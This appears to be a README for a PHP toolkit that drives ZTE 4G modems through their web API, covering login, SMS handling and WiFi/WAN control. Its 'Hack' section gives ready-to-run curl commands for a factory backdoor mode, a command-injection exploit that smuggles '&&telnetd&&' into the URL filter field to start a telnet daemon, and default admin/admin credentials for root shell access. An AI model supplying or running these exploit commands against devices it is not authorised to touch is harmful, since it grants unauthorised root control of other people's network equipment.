# ZTE API and Hack

## PHP Classes

See **src** folder:

Curl.php - Curl requests

Json.php - Json Encode / Decode

Hex.php - Hex Encode / Decode

Sms.php - Sms List, Send and Delete Message(s)

Login.php - Login

Wifi.php - WiFi Enable / Disable

Wan.php - Wan Connect / Disconnect

Hack.php - Hack the Modem

## How to Use PHP Class

**Require:**

Install php-curl extension

Install php-json extension

Set your **modem_ip** and **password** on **index.php**

**Optional:**

Composer [https://getcomposer.org](https://getcomposer.org)

**CLI interface:**

php index.php **parameters**

| parameter1 | parameter2 |  parameter3 | Result |
|------------|------------|-------------|--------|
|   ls       |            |             |**List all Messages** |
|	  rm       | #          |             |**Delete the Message #**|
|   rm       | '*'        |             |**Delete all Messages**|
|   snd      | Phone#     | 'Message'   |**Send The 'Message' to Phone#**|
|   wifi     | on/off     |             |**Enable or Disable Wifi**|
|   wan      | on/off     |             |**Connect or Disconnect WAN**|
|   hack     |            |             |**Hack Modem**|

**Obs:** Tested with PHP 7.2.29

Minimum PHP version 5.3.0

To Help please open an Issue

To contribute open a Pullrequest

***


## API

### Work with MF253M (Tested), MF823L, MF286, maybe others whit Web GUI

modem_ip is your modem IP

Password is base64 encoded
[https://www.base64encode.org](http://https://www.base64encode.org)

### Login
```
Method: POST

curl -s --header "Referer: http://<modem_ip>/index.html" -d 'isTest=false&goformId=LOGIN&password=<Password>' http://<modem_ip>/goform/goform_set_cmd_process


if is OK {"result":"3"}
if is BAD {"result":"1"}
```

### SMS List
```
Method: GET

curl -s --header "Referer: http://<modem_ip>/index.html" http://<modem_ip>//goform/goform_get_cmd_process\?isTest\=false\&cmd\=sms_data_total\&page=0\&data_per_page\=500\&mem_store\=1\&tags\=10\&order_by\=order+by+id+desc

if is OK {"messages":[]}

```

### Delete SMS Message(s)
```
Method: POST

curl -s --header "Referer: http://<modem_ip>/index.html" -d "isTest=false&goformId=DELETE_SMS&msg_id=<id>;&notCallback=true" curl -s --header "Referer: http://<modem_ip>/index.html"
http://<modem_ip>/goform/goform_set_cmd_process

id is a Message ID
To delete multiple pass ID one by one

if is OK {"result":"success"}

```

### Send SMS Message
```
Method: POST

curl -s --header "Referer: http://<modem_ip>/index.html" -d "isTest=false&goformId=SEND_SMS&notCallback=true&Number=<phone_number>&sms_time=<date>&MessageBody=<message>&ID=-1&encode_type=UNICODE"
http://<modem_ip>/goform/goform_set_cmd_process

phone_number is urlencoded
message is hexencoded

if is OK {"result":"success"}
```

### Disable WiFi
```
Method: POST

curl -s --header "Referer: http://<modem_ip>/index.html" -d 'goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled=0' http://<modem_ip>/goform/goform_set_cmd_process

if is OK {"result":"success"}

```

### Enable WiFi
```
Method: POST

curl -s --header "Referer: http:/<modem_ip>/index.html" -d 'goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled=1' http://<modem_ip>/goform/goform_set_cmd_process

if is OK {"result":"success"}

```

***

## Hack

Linux  users must install curl and telnet

Password is base64 encoded
[https://www.base64encode.org](http://https://www.base64encode.org)

Linux users may use base64 in terminal (see man base64)

modem_ip is your modem IP

### Factory Backdoor

```
Method: POST

curl -s -H "Referer: http://<modem_ip>/index.html" "http://<modem_ip>/goform/goform_set_cmd_process?isTest=false&goformId=CHANGE_MODE&change_mode=2&password=<Password>"

if is OK {"result":"success"}

```
### Enable Root Acess

```
Method: POST

curl "http://<modem_ip>/goform/goform_set_cmd_process" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Referer: http://<modem_ip>/index.html" --data "isTest=false&goformId=LOGIN&password=<Password>"

if is OK  {"result":"3"}

```

### Exploits Nvram

```
Method: POST

curl "http://<modem_ip>/goform/goform_set_cmd_process" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Referer: http://<modem_ip>/index.html" --data "isTest=false&goformId=URL_FILTER_ADD&addURLFilter=http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26"

if is OK {"result":"success"}

```

### SSH Access

```
telnet <modem_ip> 4719

User: admin
Pass: admin

```

***

### Thanks to:

[https://taisto.org/ZTE_MF823D](http://https://taisto.org/ZTE_MF823D) - for PHP Class

[https://gist.github.com/mariodian/65641792700d237d30f3f47d24c746e0](http://gist.github.com/mariodian/65641792700d237d30f3f47d24c746e0) - for script shell

[https://gist.github.com/mariodian/bafe4b0a83226d7680ee41424c4e5b7b](http://gist.github.com/mariodian/bafe4b0a83226d7680ee41424c4e5b7b) - for pushover

[https://pushover.net](http://https://pushover.net)

[https://www.fr.net.br/2016/02/modem-zte-mf823l-avaliacao.html](http://https://www.fr.net.br/2016/02/modem-zte-mf823l-avaliacao.html)

[http://my-router.blogspot.com/2015/09/zte-mf823-4g-change-ip-of-modem-and-get.html](http://http://my-router.blogspot.com/2015/09/zte-mf823-4g-change-ip-of-modem-and-get.html)

[http://blog.asiantuntijakaveri.fi/2017/03/backdoor-and-root-shell-on-zte-mf286.html](http://blog.asiantuntijakaveri.fi/2017/03/backdoor-and-root-shell-on-zte-mf286.html) - for Hack

[https://www.base64encode.org](http://https://www.base64encode.org) - for code and decode base64

[https://incarnate.github.io/curl-to-php/](https://incarnate.github.io/curl-to-php/) - for convert curl to PHP curl

